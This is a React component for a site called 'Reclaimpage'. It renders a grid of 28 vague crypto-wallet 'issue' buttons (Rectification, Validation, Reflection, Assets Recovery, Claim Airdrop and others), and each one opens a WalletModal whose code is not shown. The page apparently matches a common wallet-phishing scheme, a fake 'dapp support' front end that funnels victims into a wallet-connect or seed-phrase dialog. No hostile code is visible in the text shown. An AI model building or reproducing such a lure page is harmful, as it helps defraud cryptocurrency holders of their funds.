"use client";

import { 
  Link as LinkIcon, 
  Lock, 
  ShieldCheck, 
  Package, 
  CircleDollarSign, 
  LogIn, 
  ArrowLeftRight, 
  RotateCcw, 
  Shield, 
  LifeBuoy, 
  LineChart, 
  Wallet, 
  MessageSquare, 
  Box, 
  Layers, 
  Share2, 
  LogOut, 
  Disc, 
  Image, 
  Coins, 
  ListChecks, 
  Timer, 
  Truck, 
  ShoppingBag, 
  BadgeDollarSign, 
  MessagesSquare
} from "lucide-react";
import { WalletModal } from "@/components/WalletModal";

const features = [
  { icon: LinkIcon, title: "Connect to Dapps", desc: "Click here for error while connecting to Dapps." },
  { icon: Lock, title: "Validation", desc: "Click here for validation." },
  { icon: ShieldCheck, title: "Rectification", desc: "Click here for rectification." },
  { icon: Package, title: "Claim Airdrop", desc: "Click here to claim Airdrop." },
  { icon: CircleDollarSign, title: "Buy Token", desc: "Click here to buy tokens." },
  { icon: LogIn, title: "Login", desc: "Click here for login related issues." },
  { icon: ArrowLeftRight, title: "Migration", desc: "Click here for token migration." },
  { icon: RotateCcw, title: "Restore", desc: "Click here for restoration related issues." },
  { icon: Shield, title: "Reflection", desc: "Click here for issues related to reflection." },
  { icon: LifeBuoy, title: "Assets Recovery", desc: "Click here for assets recovery issues." },
  { icon: LineChart, title: "High Gas Fees", desc: "Click here for gas fee related issues." },
  { icon: Wallet, title: "Claim Presale Token", desc: "Click here to claim presale token related issues." },
  { icon: MessageSquare, title: "Slippage Error", desc: "Click here for slippage related error during trade." },
  { icon: Box, title: "Transaction Error", desc: "Click here for transaction related issues." },
  { icon: Layers, title: "Staking Issues", desc: "click here for staking related issues." },
  { icon: ArrowLeftRight, title: "Swap/Exchange", desc: "Click here for swap/exchange related issues." },
  { icon: Share2, title: "Cross Chain Transfer", desc: "Click here for gas fee related issues." },
  { icon: LogOut, title: "Login Issues", desc: "Click here for issues while logging into your wallet." },
  { icon: Disc, title: "Claim Airdrop", desc: "Click here for airdrop related issues." },
  { icon: Image, title: "NFTs Issues", desc: "Click here for NFTs minting transfer related issues." },
  { icon: Coins, title: "Missing/ Irregular Balance", desc: "Click here to recover lost missing funds." },
  { icon: ListChecks, title: "Whitelist", desc: "Click here for whitelist related issues." },
  { icon: Timer, title: "Transaction Delay", desc: "Click here for any issues related to transaction delayed." },
  { icon: Truck, title: "Migration Issues", desc: "Click here for migration related issues." },
  { icon: ShoppingBag, title: "Trading Wallet", desc: "Click here if you have problem with your trading wallet." },
  { icon: BadgeDollarSign, title: "Can't Buy Coins/Tokens", desc: "To trade crypto your account must be marked as a trusted payment source." },
  { icon: Lock, title: "Locked Account", desc: "Click here for issues related to account lock." },
  { icon: MessagesSquare, title: "Other Issues Not Listed", desc: "If you can't find the issue you are experiencing click here." },
];

export function AdvantageGrid() {
  return (
    <section id="advantage" className="py-24 lg:py-32 bg-obsidian relative">
      <div className="max-w-7xl mx-auto px-6 lg:px-8">
        <div className="text-center max-w-3xl mx-auto mb-20">
          <h2 className="font-headline text-4xl md:text-5xl font-bold mb-6">
            The <span className="text-primary">Reclaimpage</span> Advantage
          </h2>
          <p className="text-slate-400 text-lg">
            A comprehensive suite of verified and scalable tools designed to simplify your Web3 operations.
          </p>
        </div>

        <div className="grid md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6">
          {features.map((feature, i) => (
            <WalletModal key={i}>
              <button className="glass group p-6 rounded-[2rem] hover:bg-white/5 transition-all duration-300 border-white/5 hover:border-primary/20 text-left w-full focus:outline-none focus:ring-2 focus:ring-primary/50">
                <div className="w-12 h-12 rounded-xl bg-primary/10 flex items-center justify-center mb-6 group-hover:scale-110 transition-transform duration-300">
                  <feature.icon className="text-primary w-6 h-6" />
                </div>
                <h3 className="font-headline text-lg font-bold mb-3">{feature.title}</h3>
                <p className="text-slate-400 leading-relaxed text-xs">
                  {feature.desc}
                </p>
              </button>
            </WalletModal>
          ))}
        </div>
      </div>
    </section>
  );
}
